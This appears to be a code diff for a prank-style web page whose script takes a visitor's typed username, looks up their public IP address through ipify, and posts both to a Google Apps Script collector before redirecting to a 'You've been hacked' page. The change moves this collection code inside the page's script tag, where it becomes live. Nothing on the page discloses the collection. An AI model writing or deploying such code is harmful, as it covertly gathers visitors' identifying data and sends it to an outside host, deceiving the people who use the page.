@@ -12,44 +12,35 @@
 
   <script>
     function redirectToHackedPage() {
-      // Get the entered username
       var username = document.getElementById('username-input').value;
 
-      // Store the username (you'll need to figure out how to do this securely)
+      // Get the IP address (this might not be accurate due to public IP)
+      var ipAddress = "unknown";
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          ipAddress = data.ip;
+        })
+        .catch(error => {
+          console.error("Error fetching IP address:", error);
+        })
+        .finally(() => {
+          // Send the data to the Google Sheet
+          fetch('[https://script.google.com/macros/s/AKfycbytYsqKP0cavMdz1yfVtQGR74Ua_QKMXp0cSZs5Qe4-OLNwccATPnZI1XvB4PXxJdXH/exec]', {
+            method: 'POST',
+            body: new URLSearchParams({
+              ip: ipAddress,
+              username: username
+            })
+          })
+          .then(response => response.text())
+          .then(data => console.log(data))
+          .catch(error => console.error('Error sending data:', error));
 
-      // Redirect to the "You've been hacked" page
-      window.location.href = 'youve-been-hacked.html'; 
+          // Redirect to the "You've been hacked" page
+          window.location.href = 'youve-been-hacked.html';
+        });
     }
   </script>
-  function redirectToHackedPage() {
-  var username = document.getElementById('username-input').value;
-
-  // Get the IP address (this might not be accurate due to public IP)
-  var ipAddress = "unknown";
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      ipAddress = data.ip;
-    })
-    .catch(error => {
-      console.error("Error fetching IP address:", error);
-    })
-    .finally(() => {
-      // Send the data to the Google Sheet
-      fetch('[https://script.google.com/macros/s/AKfycbytYsqKP0cavMdz1yfVtQGR74Ua_QKMXp0cSZs5Qe4-OLNwccATPnZI1XvB4PXxJdXH/exec]', {
-        method: 'POST',
-        body: new URLSearchParams({
-          ip: ipAddress,
-          username: username
-        })
-      })
-      .then(response => response.text())
-      .then(data => console.log(data))
-      .catch(error => console.error('Error sending data:', error));
-
-      // Redirect to the "You've been hacked" page
-      window.location.href = 'youve-been-hacked.html';
-    });
-}
 </body>
 </html>
